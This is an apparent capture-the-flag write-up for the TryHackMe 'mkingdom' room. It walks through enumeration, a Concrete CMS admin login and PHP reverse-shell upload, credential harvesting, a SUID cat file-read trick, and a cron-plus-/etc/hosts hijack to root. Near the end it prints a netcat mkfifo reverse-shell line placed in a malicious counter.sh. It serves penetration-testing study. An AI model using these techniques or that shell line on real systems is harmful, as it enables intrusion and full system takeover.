Room: [mkingdom](https://tryhackme.com/r/room/mkingdom)

Difficulty: Easy

Overview: This room even though it is rated easy,i would rate it medium. We are going to exploit CMS Concrete server, gain an initial shell, then escalate privileges from user to user with constant enumeration. Finally, taking advantage of a SUID binary and bad file permission configuration to privesc to root.

------------------------------------------------------------------------------------------------------------------------------------------------------------------

As always we start our enumeration fase by running "nmap". It will scan for all open ports on the target system:

```
nmap -sV -sC -p- mkingdom.thm -oN nmap.txt

mkingdom.thm → you can add the ip of the room to /etc/hosts

-Pn → To bypass the blocking of ping probes   

-sV → To determine service/version info

-sC → To do script scan

-p- →  Scan all ports

-oN → Save scan to a file
```

![nmap](https://github.com/Slowdeb/Tryhackme/assets/76821053/231d2c11-e74f-4673-aed0-7fdd7f5fd076)

There is only one open port:

85     →  http Apache httpd 2.4.7


Port 85 hosts a http web server:

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/faac9e53-6449-4804-a630-9aa3c324a2ad)

Seeing the image i used Exiftool to see if it contains any relevant information.

```
exiftool img1.jpg
```

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/6e9969b9-94cf-4e29-b89e-9c33c3e6e791)

Found a possible user b0w53r. 

To search for any hidden directories or files we can use “Gobuster”:

```
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://mkingdom.thm:85/ -x .txt,.cgi,.php,.log,.bak,.xxx,.old

dir             → for directory brute-force

--wordlist   → Path of the wordlist

--url           →  Specify the url path

-x              → File extensions to search for
```

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/266cef14-3aac-4e36-b6d7-84262395ed40)

We found /app so let's access it.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/ab8f145a-3655-4ea6-a4ad-18c770d73a7d)

Pressing jump button we get a popup, and then it redirected us to /castle.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/22bda65a-aa85-4be9-a40f-ad61e4e286fe)

The webapp is built with Concrete CMS --version 8.5.2.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/5b0e0729-fd2e-4667-8b5b-d803cd20f290)

After exploring i manage to get to the login page.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/072ec413-9bc7-4f77-8f63-28f0e7df5d95)

Here i got stuck for a fair bit to time. After some hours of enumeration, mysql attacks , stenography, Brute force attacks at the login page, etc... I had crawled into so many rabbit holes.

Finally, i manage to login with user admin with the most simplest of the passwords... So piece of advice. Run the basics before you try any complex attacks.

Now, at the admin panel we can take advantage of the file upload function and upload a php reverse shell.

First we need to change the upload file permissions.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/fb3974c3-7c97-4e9b-8de7-d0d8df1db416)

Upload a reverse shell, i normally use pentest monkey's reverse shell.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/ec2159aa-ac68-4827-ab2e-e174ad11ba5f)

To do so, select upload Files, setup your listener and then trigger the file by going to URL to FIle.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/ffd4f85a-81e4-4628-b5fa-c5007bd647c6)

In our nc listener we recieve a shell:

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/506025ba-8838-4a21-8f95-4495f5b351c8)

Our user is www-data.

We cannot access other users directory, so let's search for passwords in php files/ database files/ config files, or any other leak of information.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/7b29fe41-704f-4a65-aab5-a46105ae8b53)

At /var/www/html/app/castle/application/config we found toad's credentials inside database.php file.

Let's privesc horizontaly to toad and search his home directory.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/8fc3bd87-cfc6-4b95-9dec-eaec1c5571c3)

Guess Toad left a message to Mario.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/cc83205c-e441-4af6-94c8-2e6860d9f9c0)

There is also a mysql log history file of toad.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/9eadf268-b632-444d-a1df-996870c03b12)

Maybe we can access the database and find something usefull.

```
mysql -u toad -h localhost -p

-u → user

-h → server 

-p → password

Usefull commands:

SHOW DATABASES;  List all databases
USE DATABASE; Select the database to use
SHOW TABLES; List tables inside database
SELECT * FROM table; List everything inside of specified table

```

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/277145e7-8779-48c0-8be7-e97bc58757e6)

Databases found:

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/b249b360-cf1d-489f-b29a-38189385a659)

I decided to investigate Database mkingdom. 

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/2ce2718b-7217-44c6-9e7c-63093ae3f1a5)

Let's extract all information from users table.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/32c37c32-c375-419f-9edc-d68c8c955d49)

It's not formatted correctly but we can read it. We found the admin hash password.

Now, we can decrypt the hash with John the Ripper.

Put the hash in a file and pass it to john.

```
john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
```

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/ebcb7483-8eec-44e0-a5ee-66e4258f89ec)

We found what we already knew. This is the credentials that got us acces the admin panel.

It is time to automate our enumeration, and to do so we are going to upload Linpeas to the target system.

![LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.

To do so we need to setup a http server and upload the file with wget.

```
Your system:

python3 -m http.server 9000  

From target system:

wget http://yourip:port/linpeas.sh

```

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/ff4b3654-5656-4356-9472-af18f0532328)

Whenever you upload files, it is a good practice to upload it to /tmp.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/abaf0e33-9ecf-4d05-838c-58e12090f8d7)

Give the binary run permissions and execute it.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/45c76426-6692-4604-912d-18a869a5754a)

Interesting PWD token found in env.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/8a216b17-17c6-4df3-89c0-d90fd7e0086d)

![env](https://www.geeksforgeeks.org/env-command-in-linux-with-examples/) is used to either print environment variables. It is also used to run a utility or command in a custom environment.

This token is base64 encoded. So let's decode it.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/7904cfb6-05a4-4e7b-bbd2-7ec4eb83941f)

Before we move on let's check some interesting information that linpeas gave us.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/b418651f-309a-470b-816a-4534d91e6f12)

Important to notice that this is a possible privesc with SUID cat.

Ok, we decode the encoded hash and now we have a password. Let's try it on mario since there is only two users in this machine, besides root.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/682cf3d2-8ffa-4d9d-a5f3-833c8b8fbb45)

We are now mario!!!

Looking at the directory of mario there's the user.txt flag, but we cannot read it because it belongs to root.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/aa28e344-0b64-4bae-b69d-7ca1f7a17dde)

So, let's run linpeas again and see if we can find more information since we are a different user.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/1c3ba454-cff5-4c7a-90dc-860f5c9346e9)

Again, Linpeas points us to SUID cat. It is time we take take advantage of this SUID.

![GTFObins](https://gtfobins.github.io) is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

Let's learn how to exploit ![cat](https://gtfobins.github.io/gtfobins/cat/).

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/229e22e4-7705-4c32-9e55-8192c2ced1c4)

```
install -m =xs $(which cat) .

LFILE=file_to_read   -- Specify the path of the file you want to read 
./cat "$LFILE"
```

We cannot use sudo in this operation.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/a062605b-d311-4a53-9e7a-78ad44b985a0)

We have got our first flag!

Now, let's try change the path of the LFILE to /etc/shadow and see if we can read it.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/c49ddd95-5baa-495a-9bd6-31a939c52f90)

We do not have permissions.

Looking again at linpeas results we have group write permissions to /etc/hosts. Curious...

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/dc8a44e3-dcf5-4ad2-8f40-44087e623f14)

This is strange, or this might point us to the right direction.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/d5b76236-c031-4ecb-99d2-f369e206c3d5)

mkingdom.thm DNS must be here for some reason.

So, turn again our focus to the webapp and at the application folder there is a counter.sh script.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/0381fd07-0132-43e5-b20d-dbf29f5b2729)

Root owns bash script counter.sh. There must be a connection here.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/995b0852-0d52-4771-a98c-2f5292647a24)

When the script runs it counts all the files and folders and give it a date.

So why is the script is here? Just to count files and folders? And why does we have permissions to write into /etc/hosts?

Let's try to monitor processes running in the system. So we have a clear view on what is runing behind the scenes.

To do so there is an app call pspy that will help us live monitor all the process running in the system 

Github source: https://github.com/DominicBreuker/pspy?tab=readme-ov-file

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/2cfc668d-e314-48b3-add6-765ad797411f)

Let's send it to the target machine.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/d77fe1fd-b1c0-429f-b0fb-5787c29f49a8)

This app monitors all the processes , it reveals any processes or scripts that are being executed.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/5e50baa5-b7f8-41d4-9eda-5576189f717a)

As we can see system runs curl everyminute has a cronjob. 

Then it looks for counter.sh and executes it.

It is time we take advantage of /etc/hosts and the cronjob that runs everyminute.

We are going to modify the ip of the webserver and host a malicious counter.sh script so we can get a reverse shell has root.

Edit /etc/hosts:

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/1558cace-8503-4b85-a899-c7bf6452ffb0)

I did it this way since i could not get vi or nano to run in a proper way.

Now, let's setup a http server and host the counter file with our reverse shell in it.

This is the reverse shell that i used.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/a091e2a5-d6f7-4a93-8a31-ae0ff334b5e3)

We have to created the directories that curl will look for when he runs.

```
/app/castle/application

counter.sh content:

#!/bin/bash

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP PORT >/tmp/f


```

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/7733e277-69d5-4777-bb97-ea70cb729417)

Finally, start the http server in the mkingdom directory and wait for the curl command from the mkingdom server.

Important detail, we need to setup our http server on port 85, since it is the port that curl looks for.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/5c058f02-b90d-4206-8814-ff8d0c4fefcc)

As you can see, we get a request on our server, and counter.sh was downloaded.

Don't forget to setup the listener on your chosen port. Because, when the counter.sh is executed we will recieve a shell has root!

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/dc89c183-2460-4d44-bd80-40730ddd9516)

Last final challenge. We cannot read the contents of the root's flag. 

This happens because we are not the owners of /bin/bash. It belongs to toad.

So, use the same tecnique has before with the SUID binary cat.

![image](https://github.com/Slowdeb/Tryhackme/assets/76821053/6e01b85e-ed28-4dbe-8c57-ca1df2186a7c)

Success!!! Last flag!!!




































































